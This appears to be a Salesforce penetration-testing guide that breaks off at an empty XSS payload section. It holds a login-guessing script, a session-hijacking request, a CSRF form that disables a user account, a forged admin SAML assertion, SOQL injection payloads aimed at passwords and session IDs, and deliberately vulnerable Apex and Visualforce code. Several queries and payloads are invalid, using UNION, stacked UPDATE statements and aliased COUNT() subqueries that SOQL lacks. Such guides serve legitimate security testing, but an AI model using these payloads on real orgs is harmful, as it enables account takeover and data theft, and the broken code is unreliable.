___
## Table of Contents

1. [Pre-Engagement Setup](#pre-engagement-setup)
2. [Reconnaissance & Intelligence Gathering](#reconnaissance--intelligence-gathering)
3. [Authentication Security Assessment](#authentication-security-assessment)
4. [Authorization & Access Control Testing](#authorization--access-control-testing)
5. [Data Security Evaluation](#data-security-evaluation)
6. [Custom Code Security Analysis](#custom-code-security-analysis)
7. [Platform Configuration Security](#platform-configuration-security)
8. [API Security Testing](#api-security-testing)
9. [Integration Security Assessment](#integration-security-assessment)
10. [Advanced Attack Vectors](#advanced-attack-vectors)
11. [Post-Exploitation & Persistence](#post-exploitation--persistence)
12. [Detection Evasion](#detection-evasion)
13. [Reporting & Evidence Collection](#reporting--evidence-collection)

---

## Pre-Engagement Setup

### Essential Tools
- **Salesforce CLI (sfdx)**: Metadata manipulation and org access
- **Burp Suite Professional**: API interception and manipulation
- **Salesforce Inspector**: Browser extension for metadata exploration
- **Postman**: API testing and automation
- **PMD with Apex Rules**: Static code analysis
- **simple_salesforce (Python)**: Automated API testing

### Initial Access Validation
```sql
-- Verify current user context
SELECT Id, Username, Profile.Name, UserRole.Name, 
       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData
FROM User WHERE Id = :UserInfo.getUserId()

-- Check organization details
SELECT Id, Name, OrganizationType, InstanceName, IsSandbox, Edition
FROM Organization
```

---

## Reconnaissance & Intelligence Gathering

### 1. Salesforce Instance Discovery

**Objective**: Identify all Salesforce instances and public attack surfaces.

**Methods**:
```bash
# Subdomain enumeration
subfinder -d target.com | grep -E "(salesforce|force|lightning|my\.salesforce)"
amass enum -passive -d target.com | grep -E "(salesforce|force|lightning)"

# Certificate transparency analysis
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | grep -E "(salesforce|force|lightning)"

# DNS enumeration
dig TXT target.com | grep -i salesforce
dig CNAME www.target.com | grep -i salesforce
```

**Impact**: Reveals additional attack surfaces and potential shadow IT implementations.

### 2. Organization Metadata Enumeration

**Objective**: Gather critical organizational information and identify edition-specific features.

**SOQL Queries**:
```sql
-- Comprehensive org information
SELECT Id, Name, OrganizationType, InstanceName, IsSandbox, 
       LanguageLocaleKey, DefaultLocaleSidKey, TimeZoneSidKey, 
       CreatedDate, Edition, TrialExpirationDate
FROM Organization

-- Feature availability detection
SELECT Id, FeatureType, Name, ParentId 
FROM Feature WHERE IsEnabled = true

-- License information
SELECT Id, Name, Status, UsedLicenses, TotalLicenses, LicenseDefinitionKey
FROM UserLicense

-- API version capabilities
SELECT Id, VersionNumber, Status, ReleaseDate
FROM ApiVersion ORDER BY VersionNumber DESC
```

**Impact**: Understanding platform capabilities and limitations for targeted attack planning.

### 3. User & Role Intelligence

**Objective**: Map organizational hierarchy and identify high-value targets.

**SOQL Queries**:
```sql
-- Comprehensive user enumeration
SELECT Id, Username, Email, Name, Title, Department, Division, 
       IsActive, LastLoginDate, LastPasswordChangeDate, 
       Profile.Name, UserRole.Name, UserType, CreatedDate,
       NumberOfFailedLogins, PasswordNeverExpires
FROM User 
ORDER BY LastLoginDate DESC NULLS LAST

-- Administrative user identification
SELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, 
       LastLoginDate, IsActive, CreatedDate
FROM User 
WHERE Profile.Name IN ('System Administrator', 'System Administrator Light') 
   OR Profile.PermissionsModifyAllData = true 
   OR Profile.PermissionsViewAllData = true

-- External and partner users
SELECT Id, Username, Email, UserType, ContactId, AccountId, 
       IsActive, LastLoginDate, CreatedDate
FROM User 
WHERE UserType IN ('PowerPartner', 'PowerCustomerSuccess', 
                  'CustomerSuccess', 'Partner', 'Guest', 'CspLitePortal')

-- Recently created users (potential backdoors)
SELECT Id, Username, Email, Name, CreatedDate, CreatedBy.Name, 
       IsActive, LastLoginDate
FROM User 
WHERE CreatedDate = LAST_N_DAYS:30 
ORDER BY CreatedDate DESC

-- Service accounts identification
SELECT Id, Username, Email, Name, IsActive, LastLoginDate, CreatedDate
FROM User 
WHERE (Name LIKE '%service%' OR Name LIKE '%integration%' 
    OR Name LIKE '%api%' OR Username LIKE '%service%' 
    OR Username LIKE '%integration%' OR Username LIKE '%api%')
```

**Impact**: Identifies high-value targets for social engineering and credential attacks.

### 4. Custom Code & Object Discovery

**Objective**: Enumerate custom attack surface including Apex, Visualforce, and Lightning components.

**SOQL Queries**:
```sql
-- Custom objects
SELECT QualifiedApiName, Label, PluralLabel, IsCustomizable, 
       KeyPrefix, RecordTypesSupported
FROM EntityDefinition 
WHERE IsCustomizable = true AND NamespacePrefix = null

-- Apex classes
SELECT Id, Name, Body, LengthWithoutComments, ApiVersion, 
       CreatedDate, CreatedBy.Name, LastModifiedDate, 
       LastModifiedBy.Name, Status, NamespacePrefix
FROM ApexClass 
WHERE Status = 'Active' AND NamespacePrefix = null

-- Apex triggers
SELECT Id, Name, TableEnumOrId, Body, ApiVersion, Status,
       UsageBeforeInsert, UsageAfterInsert, UsageBeforeUpdate, 
       UsageAfterUpdate, UsageBeforeDelete, UsageAfterDelete
FROM ApexTrigger 
WHERE Status = 'Active'

-- Visualforce pages
SELECT Id, Name, Markup, ControllerType, CreatedDate, 
       CreatedBy.Name, LastModifiedDate, IsAvailableInTouch
FROM ApexPage

-- Lightning components
SELECT Id, DeveloperName, Description, Source, CreatedDate
FROM LightningComponentBundle 
WHERE IsDeleted = false

-- REST endpoints
SELECT Id, DeveloperName, NamespacePrefix, HttpMethods, 
       Description, Status
FROM RestResource 
WHERE Status = 'Active'
```

**Impact**: Identifies custom code that likely contains vulnerabilities absent from standard Salesforce functionality.

---

## Authentication Security Assessment

### 1. Password Policy Evaluation

**Objective**: Assess password requirements and account lockout policies.

**Navigation**: Setup → Security → Password Policies

**SOQL Query**:
```sql
-- Password policy configuration (if accessible)
SELECT ComplexityRequirement, MinPasswordLength, PasswordLockoutThreshold,
       LockoutInterval, MaxPasswordAge, MinPasswordAge,
       PasswordHistoryRestriction, QuestionRestriction
FROM PasswordPolicy
```

**Manual Checks**:
- Minimum password length (≥12 recommended)
- Complexity requirements (uppercase, lowercase, numbers, symbols)
- Password history (prevent last 3-5 passwords)
- Lockout threshold (≤5 failed attempts)
- Lockout duration (≥15 minutes)

**Automated Testing**:
```python
def test_password_policy_weakness(base_url, username):
    """Test password policy enforcement"""
    weak_passwords = [
        "password123", "123456789", "qwerty123", 
        "admin123", "welcome123", "Password1"
    ]
    
    lockout_threshold = 0
    for password in weak_passwords:
        response = requests.post(f"{base_url}/login.jsp", 
                               data={'username': username, 'pw': password})
        lockout_threshold += 1
        
        if "invalid login" in response.text.lower():
            print(f"Attempt {lockout_threshold}: Weak password rejected")
        elif "locked" in response.text.lower():
            print(f"Account locked after {lockout_threshold} attempts")
            break
            
    return lockout_threshold
```

**Impact**: Weak policies enable brute force and credential stuffing attacks.

### 2. Multi-Factor Authentication (MFA) Assessment

**Objective**: Evaluate MFA implementation and identify potential bypasses.

**SOQL Queries**:
```sql
-- Users without MFA enrolled
SELECT Id, Username, Email, Name, Profile.Name, LastLoginDate,
       (SELECT COUNT() FROM TwoFactorInfo WHERE UserId = User.Id) as MFA_Methods
FROM User 
WHERE IsActive = true 
HAVING MFA_Methods = 0

-- MFA method analysis
SELECT Id, UserId, User.Username, User.Email, Type, IsActive, 
       CreatedDate, LastUsedDate
FROM TwoFactorInfo 
ORDER BY LastUsedDate DESC NULLS LAST

-- Profile MFA requirements
SELECT Id, Name, RequiresMfa
FROM Profile

-- Login flow MFA requirements
SELECT Id, DeveloperName, UsedForAuthentication, Description
FROM Flow 
WHERE Type = 'LoginFlow' AND Status = 'Active'
```

**MFA Bypass Testing**:
```bash
# Test API access bypass
curl -X POST https://instance.salesforce.com/services/oauth2/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=CLIENT_ID&client_secret=CLIENT_SECRET&username=USER&password=PASS"

# Test session fixation
document.cookie = "sid_Client=fixed_session_value; domain=.salesforce.com; path=/";
```

**Impact**: Users without MFA are vulnerable to account takeover via credential compromise.

### 3. Session Security Analysis

**Objective**: Evaluate session management controls and identify session-based vulnerabilities.

**Navigation**: Setup → Security → Session Settings

**Critical Settings**:
- Session Security Level: High Assurance
- Lock sessions to IP address: Enabled
- Lock sessions to domain: Enabled  
- Disable concurrent sessions: Enabled
- Session timeout: ≤2 hours
- Force logout on timeout: Enabled

**Session Testing**:
```python
def test_session_hijacking(original_session, target_ip):
    """Test session hijacking from different IP"""
    headers = {
        'Cookie': f'sid_Client={original_session}',
        'X-Forwarded-For': target_ip,
        'User-Agent': 'AttackerAgent/1.0'
    }
    
    response = requests.get(
        'https://instance.salesforce.com/home/home.jsp',
        headers=headers
    )
    
    if response.status_code == 200:
        print("Session hijacking successful - IP locking not implemented")
    else:
        print("Session hijacking failed - IP locking active")
```

**CSRF Testing**:
```html
<!-- CSRF test payload -->
<form action="https://instance.salesforce.com/setup/own/users.jsp" method="POST">
    <input type="hidden" name="save" value="1">
    <input type="hidden" name="id" value="005XX000001b0Qw">
    <input type="hidden" name="IsActive" value="false">
    <input type="submit" value="Disable User Account">
</form>
```

**Impact**: Weak session controls enable session hijacking and CSRF attacks.

### 4. Single Sign-On (SSO) Security

**Objective**: Evaluate SSO implementation for security weaknesses and potential bypasses.

**SOQL Queries**:
```sql
-- SAML SSO settings
SELECT Id, Name, Issuer, EntityId, IdentityLocation, 
       IdentityMapping, AttributeFormat, OptionsSpInitBinding
FROM SamlSsoConfig

-- Connected apps with SSO
SELECT Id, Name, CallbackUrl, ConsumerKey, UsePkce, 
       OptionsFullScopeApprovals, OptionsRefreshTokenValidityMetric
FROM ConnectedApplication 
WHERE CallbackUrl LIKE '%saml%' OR CallbackUrl LIKE '%sso%'
```

**SAML Response Manipulation**:
```xml
<!-- Test SAML assertion tampering -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
            admin@target.com <!-- Privilege escalation attempt -->
        </saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
        <saml:Attribute Name="Profile">
            <saml:AttributeValue>System Administrator</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
```

**SSO Bypass Testing**:
```bash
# Test direct login bypass
curl -X POST https://instance.salesforce.com/login.jsp \
  -d "username=user@domain.com&pw=password" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Impact**: SSO vulnerabilities can lead to authentication bypass and privilege escalation.

---

## Authorization & Access Control Testing

### 1. Profile & Permission Analysis

**Objective**: Identify privilege escalation opportunities and excessive permissions.

**High-Privilege Discovery**:
```sql
-- System administrators and equivalent users
SELECT Id, Username, Email, Name, Profile.Name, UserRole.Name, 
       IsActive, LastLoginDate, CreatedDate,
       Profile.PermissionsModifyAllData, Profile.PermissionsViewAllData,
       Profile.PermissionsManageUsers, Profile.PermissionsCustomizeApplication
FROM User 
WHERE Profile.PermissionsModifyAllData = true 
   OR Profile.PermissionsViewAllData = true 
   OR Profile.PermissionsManageUsers = true
   OR Profile.PermissionsCustomizeApplication = true
ORDER BY LastLoginDate DESC NULLS LAST

-- Dangerous permission combinations
SELECT Id, Username, Profile.Name,
       Profile.PermissionsModifyAllData as ModifyAll,
       Profile.PermissionsViewAllData as ViewAll,
       Profile.PermissionsManageUsers as ManageUsers,
       Profile.PermissionsCustomizeApplication as CustomizeApp,
       Profile.PermissionsApiEnabled as ApiEnabled
FROM User 
WHERE Profile.PermissionsModifyAllData = true 
   OR (Profile.PermissionsViewAllData = true AND Profile.PermissionsManageUsers = true)
   OR Profile.PermissionsCustomizeApplication = true

-- Recently elevated users
SELECT Id, Username, Email, Name, Profile.Name, CreatedDate,
       (SELECT COUNT() FROM PermissionSetAssignment 
        WHERE AssigneeId = User.Id AND CreatedDate = LAST_N_DAYS:30) as Recent_PermSets
FROM User 
WHERE Profile.Name LIKE '%Admin%' 
  AND CreatedDate = LAST_N_DAYS:90
```

**Permission Set Analysis**:
```sql
-- High-risk permission sets
SELECT Id, Name, Description, Type, IsOwnedByProfile,
       PermissionsModifyAllData, PermissionsViewAllData,
       PermissionsManageUsers, PermissionsCustomizeApplication,
       PermissionsApiEnabled,
       (SELECT COUNT() FROM PermissionSetAssignment 
        WHERE PermissionSetId = PermissionSet.Id) as AssigneeCount
FROM PermissionSet 
WHERE PermissionsModifyAllData = true 
   OR PermissionsViewAllData = true 
   OR PermissionsManageUsers = true
   OR PermissionsCustomizeApplication = true
ORDER BY AssigneeCount DESC

-- Permission set assignments with potential issues
SELECT Id, PermissionSet.Name, PermissionSet.PermissionsModifyAllData,
       Assignee.Username, Assignee.Profile.Name, AssignmentId,
       ExpirationDate, CreatedDate, CreatedBy.Name
FROM PermissionSetAssignment 
WHERE ExpirationDate != null 
   OR (PermissionSet.PermissionsModifyAllData = true AND ExpirationDate = null)
ORDER BY CreatedDate DESC
```

**Impact**: Over-privileged users can lead to complete tenant compromise.

### 2. Field-Level Security Assessment

**Objective**: Identify sensitive data exposure through inadequate field-level security.

**Sensitive Field Discovery**:
```sql
-- Potentially sensitive fields identification
SELECT EntityDefinition.QualifiedApiName as ObjectName,
       QualifiedApiName as FieldName, Label, DataType, 
       IsEncrypted, SecurityClassification, ComplianceGroup,
       Description
FROM FieldDefinition 
WHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' 
    OR Label LIKE '%Tax%' OR Label LIKE '%EIN%' OR Label LIKE '%TIN%'
    OR Label LIKE '%Credit Card%' OR Label LIKE '%Bank%' 
    OR Label LIKE '%Account Number%' OR Label LIKE '%Routing%'
    OR Label LIKE '%Password%' OR Label LIKE '%Secret%' 
    OR Label LIKE '%Key%' OR Label LIKE '%Token%'
    OR Label LIKE '%Salary%' OR Label LIKE '%Income%'
    OR Label LIKE '%DOB%' OR Label LIKE '%Birth%')
   AND IsEncrypted = false
ORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC

-- Field accessibility by profile
SELECT Id, Field, Parent.Name as ProfileName, 
       PermissionsRead, PermissionsEdit
FROM FieldPermissions 
WHERE Field IN (
    SELECT QualifiedApiName FROM FieldDefinition 
    WHERE Label LIKE '%SSN%' OR Label LIKE '%Credit%' 
       OR Label LIKE '%Password%' OR Label LIKE '%Salary%'
)
ORDER BY Field, Parent.Name
```

**Field Access Testing**:
```apex
// Apex script to test field accessibility
public class FieldSecurityTester {
    public static void testFieldAccess(String objectName, String fieldName) {
        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);
        Schema.DescribeSObjectResult objectDescribe = objectType.getDescribe();
        Schema.SObjectField field = objectDescribe.fields.getMap().get(fieldName);
        
        if (field != null) {
            Schema.DescribeFieldResult fieldDescribe = field.getDescribe();
            System.debug('Field: ' + fieldName);
            System.debug('Accessible: ' + fieldDescribe.isAccessible());
            System.debug('Updateable: ' + fieldDescribe.isUpdateable());
            System.debug('Createable: ' + fieldDescribe.isCreateable());
            
            // Test actual data access
            try {
                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + ' LIMIT 1';
                List<SObject> records = Database.query(query);
                System.debug('Query successful - field accessible');
            } catch (Exception e) {
                System.debug('Query failed: ' + e.getMessage());
            }
        }
    }
}
```

**Impact**: Unauthorized access to sensitive field data, PII exposure, compliance violations.

### 3. Record-Level Security Analysis

**Objective**: Evaluate sharing model security and identify unauthorized record access.

**Organization-Wide Defaults Assessment**:
```sql
-- Organization-wide default settings
SELECT Id, SobjectType, DefaultInternal, DefaultExternal,
       DefaultCaseOwnerId, DefaultOpportunityOwnerId
FROM OrganizationWideDefault 
WHERE DefaultInternal = 'Public' OR DefaultExternal = 'Public'
```

**Sharing Rules Analysis**:
```sql
-- Account sharing rules
SELECT Id, Name, AccountAccessLevel, CaseAccessLevel, 
       ContactAccessLevel, OpportunityAccessLevel, 
       AccessMapping, Description, SharedToType
FROM AccountSharingRule 
WHERE AccountAccessLevel IN ('Edit', 'All')

-- Custom object sharing rules  
SELECT Id, Name, AccessLevel, SobjectType, Description,
       SharedToType, SharedTo
FROM CustomObjectSharingRule 
WHERE AccessLevel IN ('Edit', 'All')

-- Manual sharing analysis
SELECT Id, UserOrGroupId, AccountId, AccountAccessLevel, 
       RowCause, IsDeleted, LastModifiedDate, LastModifiedBy.Name
FROM AccountShare 
WHERE RowCause = 'Manual' AND AccountAccessLevel IN ('Edit', 'All')
ORDER BY LastModifiedDate DESC
```

**Record Access Testing**:
```apex
// Test record accessibility across different user contexts
public class RecordAccessTester {
    public static void testRecordAccess(Id recordId, Id userId) {
        System.runAs(new User(Id = userId)) {
            try {
                String objectType = recordId.getSObjectType().getDescribe().getName();
                String query = 'SELECT Id, Name FROM ' + objectType + ' WHERE Id = :recordId';
                List<SObject> records = Database.query(query);
                
                if (!records.isEmpty()) {
                    System.debug('Record accessible to user: ' + userId);
                    
                    // Test edit access
                    SObject record = records[0];
                    try {
                        update record;
                        System.debug('Record editable by user: ' + userId);
                    } catch (DmlException e) {
                        System.debug('Record not editable: ' + e.getMessage());
                    }
                }
            } catch (QueryException e) {
                System.debug('Record not accessible: ' + e.getMessage());
            }
        }
    }
}
```

**Impact**: Horizontal privilege escalation, unauthorized access to sensitive records.

### 4. Guest User Security Assessment

**Objective**: Evaluate guest user security and identify potential abuse vectors.

**Guest User Configuration Analysis**:
```sql
-- Guest user profiles and permissions
SELECT Id, Name, UserType, PermissionsApiEnabled, PermissionsRunReports,
       PermissionsViewSetup, PermissionsModifyAllData, PermissionsViewAllData
FROM Profile 
WHERE Name LIKE '%Guest%' OR UserType = 'Guest'

-- Site guest user settings
SELECT Id, Name, Status, AdminId, GuestUserId, AnalyticsTrackingCode,
       ClickjackProtectionLevel, GuestUserProfile.Name,
       GuestUserProfile.PermissionsApiEnabled
FROM Site 
WHERE Status = 'Active'

-- Guest user record access via OWD
SELECT Id, SobjectType, DefaultExternal
FROM OrganizationWideDefault 
WHERE DefaultExternal IN ('Public', 'PublicReadOnly', 'PublicReadWrite')
```

**Guest User Exploitation Testing**:
```javascript
// Guest user API access testing (unauthenticated context)
fetch('/services/data/v52.0/sobjects/', {
    method: 'GET',
    headers: { 'Content-Type': 'application/json' }
}).then(response => {
    if (response.ok) {
        console.log('Guest API access available');
        return response.json();
    }
}).then(data => {
    console.log('Available objects:', data);
});

// Test guest user SOQL injection
const maliciousQuery = "' UNION SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Admin%'--";
fetch('/services/data/v52.0/query/?q=SELECT Id FROM Account WHERE Name = \'' + maliciousQuery, {
    method: 'GET'
});
```

**Impact**: Unauthenticated data access, potential for public data exposure.

---

## Data Security Evaluation

### 1. Sensitive Data Discovery & Classification

**Objective**: Identify, catalog, and assess protection of sensitive data.

**Comprehensive Data Discovery**:
```sql
-- PII and sensitive data identification
SELECT EntityDefinition.QualifiedApiName as ObjectName,
       QualifiedApiName as FieldName, Label, DataType, 
       IsEncrypted, SecurityClassification, ComplianceGroup,
       IsCalculated, IsCompound
FROM FieldDefinition 
WHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' 
    OR Label LIKE '%Tax%' OR Label LIKE '%Credit Card%' 
    OR Label LIKE '%Bank%' OR Label LIKE '%Passport%'
    OR Label LIKE '%Driver%' OR Label LIKE '%Medical%'
    OR QualifiedApiName LIKE '%SSN%' OR QualifiedApiName LIKE '%Tax%')
ORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC

-- Financial data discovery  
SELECT Id, QualifiedApiName, Label, EntityDefinition.QualifiedApiName as ObjectName
FROM FieldDefinition 
WHERE DataType IN ('Currency', 'Number', 'Percent') 
  AND (Label LIKE '%Amount%' OR Label LIKE '%Price%' 
    OR Label LIKE '%Cost%' OR Label LIKE '%Revenue%' 
    OR Label LIKE '%Budget%' OR Label LIKE '%Payment%')

-- Data volume assessment
SELECT COUNT() as RecordCount, 'Account' as ObjectType FROM Account
UNION ALL SELECT COUNT(), 'Contact' FROM Contact  
UNION ALL SELECT COUNT(), 'Lead' FROM Lead
UNION ALL SELECT COUNT(), 'Opportunity' FROM Opportunity
UNION ALL SELECT COUNT(), 'Case' FROM Case
```

**Pattern-Based Sensitive Data Detection**:
```apex
// Apex script for sensitive data pattern detection
public class SensitiveDataScanner {
    public static void scanForPatterns(String objectName, String fieldName, Integer limitRecords) {
        String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + 
                      ' WHERE ' + fieldName + ' != null LIMIT ' + limitRecords;
        
        try {
            List<SObject> records = Database.query(query);
            for (SObject record : records) {
                String fieldValue = String.valueOf(record.get(fieldName));
                
                // Pattern matching for sensitive data
                if (Pattern.matches('\\d{3}-\\d{2}-\\d{4}', fieldValue)) {
                    System.debug('SSN pattern found: ' + record.Id);
                }
                if (Pattern.matches('\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}', fieldValue)) {
                    System.debug('Credit card pattern found: ' + record.Id);
                }
                if (Pattern.matches('\\d{9}', fieldValue)) {
                    System.debug('Tax ID pattern found: ' + record.Id);
                }
            }
        } catch (Exception e) {
            System.debug('Error scanning field: ' + e.getMessage());
        }
    }
}
```

**Impact**: Identifies data requiring enhanced protection and compliance considerations.

### 2. Data Export & Exfiltration Assessment

**Objective**: Identify data export capabilities that could enable bulk data theft.

**Data Export Analysis**:
```sql
-- Data export job history
SELECT Id, Type, Status, CreatedDate, CreatedBy.Name, 
       StartedDate, EndDate, JobItemsProcessed
FROM DataExport 
ORDER BY CreatedDate DESC

-- Scheduled export jobs
SELECT Id, Name, CronExpression, State, NextFireTime, 
       CreatedBy.Name, CreatedDate
FROM CronJobDetail 
WHERE JobType = 'DataExport'

-- Reports with export capabilities
SELECT Id, Name, Format, DeveloperName, CreatedBy.Name, 
       IsDeleted, LastRunDate, Description
FROM Report 
WHERE Format IN ('TABULAR', 'SUMMARY', 'MATRIX') 
ORDER BY LastRunDate DESC NULLS LAST
```

**Bulk API Testing**:
```python
def test_bulk_export(session_id, instance_url, sobject_type):
    """Test bulk data extraction capabilities"""
    job_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <jobInfo xmlns="http://www.force.com/2009/06/async/dataloader">
        <operation>query</operation>
        <object>{sobject_type}</object>
        <contentType>CSV</contentType>
    </jobInfo>"""
    
    headers = {
        'X-SFDC-Session': session_id,
        'Content-Type': 'application/xml'
    }
    
    response = requests.post(
        f"{instance_url}/services/async/52.0/job",
        data=job_xml,
        headers=headers
    )
    
    if response.status_code == 201:
        print(f"Bulk export job created for {sobject_type}")
        return True
    else:
        print(f"Bulk export failed: {response.status_code}")
        return False
```

**Impact**: Identifies vectors for large-scale data exfiltration.

### 3. Encryption Assessment

**Objective**: Evaluate data encryption implementation and identify protection gaps.

**Platform Encryption Analysis**:
```sql
-- Encrypted fields inventory
SELECT QualifiedApiName, Label, IsEncrypted, 
       EntityDefinition.QualifiedApiName as ObjectName
FROM FieldDefinition 
WHERE IsEncrypted = true 
ORDER BY EntityDefinition.QualifiedApiName

-- Encryption coverage gaps for sensitive fields
SELECT QualifiedApiName, Label, IsEncrypted,
       EntityDefinition.QualifiedApiName as ObjectName
FROM FieldDefinition 
WHERE IsEncrypted = false 
  AND (Label LIKE '%SSN%' OR Label LIKE '%Credit%' 
    OR Label LIKE '%Bank%' OR Label LIKE '%Password%' 
    OR Label LIKE '%Secret%')
ORDER BY EntityDefinition.QualifiedApiName

-- Encryption key information (if accessible)
SELECT Id, MasterLabel, IsActive, CreatedDate, LastModifiedDate
FROM EncryptionKey

-- Encryption policy analysis
SELECT Id, MasterLabel, IsActive, Description
FROM EncryptionPolicy
```

**Encryption Bypass Testing**:
```apex
// Test encrypted field access patterns
public class EncryptionTester {
    public static void testEncryptedFieldAccess() {
        try {
            List<Contact> contacts = [SELECT Id, SSN__c FROM Contact LIMIT 10];
            for (Contact c : contacts) {
                if (c.SSN__c != null) {
                    System.debug('Encrypted field accessible: ' + c.Id);
                    // In properly encrypted fields, this should show masked values
                    System.debug('Value: ' + c.SSN__c);
                }
            }
        } catch (Exception e) {
            System.debug('Encryption access error: ' + e.getMessage());
        }
    }
}
```

**Impact**: Identifies unprotected sensitive data vulnerable to exposure.

---

## Custom Code Security Analysis

### 1. SOQL/SOSL Injection Vulnerabilities

**Objective**: Identify injection vulnerabilities in dynamic queries.

**Vulnerable Pattern Detection**:
```sql
-- Find Apex classes with potential SOQL injection
SELECT Id, Name, Body
FROM ApexClass 
WHERE Status = 'Active' 
  AND (Body LIKE '%Database.query(%' OR Body LIKE '%Database.getQueryLocator(%')
  AND Body LIKE '%+%'

-- Find classes using dynamic SOSL
SELECT Id, Name, Body
FROM ApexClass
WHERE Status = 'Active'
  AND Body LIKE '%Search.query(%'
  AND Body LIKE '%+%'
```

**Static Analysis Examples**:
```apex
// VULNERABLE: Direct string concatenation
public List<Account> searchAccounts(String searchTerm) {
    String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \'%' + searchTerm + '%\'';
    return Database.query(query);
}

// VULNERABLE: ORDER BY injection
public List<Account> getAccountsSorted(String sortField) {
    String query = 'SELECT Id, Name FROM Account ORDER BY ' + sortField;
    return Database.query(query);
}

// SECURE: Using bind variables
public List<Account> searchAccountsSecure(String searchTerm) {
    String searchKey = '%' + searchTerm + '%';
    return [SELECT Id, Name FROM Account WHERE Name LIKE :searchKey];
}
```

**Injection Payloads**:
```sql
-- Data extraction payload
test%' UNION SELECT Id, Password__c FROM User WHERE Profile.Name = 'System Administrator' AND Name LIKE '%

-- Privilege escalation payload  
test%' UNION SELECT Id FROM PermissionSetAssignment WHERE PermissionSet.Name = 'Admin_Rights' AND AssigneeId = '005XX000001b0Qw' AND Id LIKE '%

-- Information disclosure payload
test%' UNION SELECT Id, SessionId__c FROM Custom_Session__c WHERE User__c = '005XX000001b0Qw' AND Id LIKE '%

-- ORDER BY subquery injection
Name (SELECT Name FROM Contact WHERE LastName = 'Smith')
```

**Advanced SOQL Injection Testing**:
```apex
public class SOQLInjectionTester {
    public static void testDynamicQuery(String userInput) {
        try {
            // Test various injection payloads
            List<String> payloads = new List<String>{
                '\' OR Name != \'',
                '\' UNION SELECT Id FROM User--',
                '\'; UPDATE User SET IsActive = false; SELECT Id FROM Account WHERE Name = \'',
                '\' AND (SELECT COUNT() FROM User) > 0 AND Name = \''
            };
            
            for (String payload : payloads) {
                try {
                    String query = 'SELECT Id FROM Account WHERE Name = \'' + payload + '\'';
                    List<SObject> results = Database.query(query);
                    System.debug('Payload successful: ' + payload);
                } catch (Exception e) {
                    System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());
                }
            }
        } catch (Exception e) {
            System.debug('Testing error: ' + e.getMessage());
        }
    }
}
```

**Impact**: Data exfiltration, authentication bypass, privilege escalation.

### 2. Authorization Bypass in Apex

**Objective**: Identify missing sharing enforcement and CRUD/FLS checks.

**Sharing Bypass Detection**:
```apex
// VULNERABLE: Missing sharing enforcement
public without sharing class DataController {
    public List<Account> getAllAccounts() {
        return [SELECT Id, Name, Revenue__c FROM Account]; // Bypasses sharing rules
    }
}

// VULNERABLE: No sharing keyword (defaults to without sharing in many contexts)
public class UnsafeController {
    @AuraEnabled
    public static List<Contact> getContacts() {
        return [SELECT Id, Name, Email, SSN__c FROM Contact]; // System context
    }
}

// SECURE: Proper sharing enforcement
public with sharing class SecureController {
    public List<Account> getAccessibleAccounts() {
        return [SELECT Id, Name FROM Account WITH SECURITY_ENFORCED];
    }
}
```

**CRUD/FLS Bypass Examples**:
```apex
// VULNERABLE: Missing object-level permissions check
public class UnsafeController {
    public void createAccount(String name) {
        Account acc = new Account(Name = name);
        insert acc; // No createable() check
    }
}

// VULNERABLE: Missing field-level security check
public class FieldBypassController {
    public void updateSensitiveField(Id accountId, String ssnValue) {
        Account acc = new Account(Id = accountId, SSN__c = ssnValue);
        update acc; // No field updateable() check
    }
}

// SECURE: Proper security checks
public class SecureController {
    public void createAccountSecure(String name) {
        if (!Schema.sObjectType.Account.isCreateable()) {
            throw new AuraHandledException('Access Denied');
        }
        
        Account acc = new Account(Name = name);
        insert acc;
    }
}
```

**Automated Vulnerability Scanning**:
```apex
public class ApexSecurityScanner {
    public static void scanForSecurityIssues() {
        List<ApexClass> classes = [SELECT Id, Name, Body FROM ApexClass WHERE Status = 'Active'];
        
        for (ApexClass cls : classes) {
            String body = cls.Body.toLowerCase();
            
            // Check for SOQL injection patterns
            if (body.contains('database.query(') && body.contains(' + ')) {
                System.debug('Potential SOQL injection in: ' + cls.Name);
            }
            
            // Check for missing sharing enforcement
            if (!body.contains('with sharing') && !body.contains('inherited sharing')) {
                System.debug('No sharing enforcement in: ' + cls.Name);
            }
            
            // Check for direct DML without security checks
            if ((body.contains('insert ') || body.contains('update ') || body.contains('delete ')) 
                && !body.contains('iscreatable') && !body.contains('isupdateable') 
                && !body.contains('isdeletable')) {
                System.debug('Missing CRUD checks in: ' + cls.Name);
            }
        }
    }
}
```

**Impact**: Complete bypass of Salesforce security model, privilege escalation.

### 3. Visualforce Security Vulnerabilities

**Objective**: Identify XSS, CSRF, and information disclosure in Visualforce pages.

**XSS Vulnerability Patterns**:
```html
<!-- VULNERABLE: Unescaped output -->
<apex:page controller="MyController">
    <apex:outputText value="{!userInput}" escape="false"/>
    
    <!-- VULNERABLE: Direct parameter access -->
    <script>
        var userdata = '{!$CurrentPage.parameters.data}';
    </script>
    
    <!-- VULNERABLE: Unvalidated rich text -->
    <apex:inputField value="{!record.Description__c}" richText="true"/>
</apex:page>

<!-- SECURE: Proper escaping -->
<apex:page controller="MyController">
    <apex:outputText value="{!HTMLENCODE(userInput)}"/>
    <script>
        var userdata = '{!JSENCODE($CurrentPage.parameters.data)}';
    </script>
</apex:page>
```

**XSS Testing Payloads**:
```html
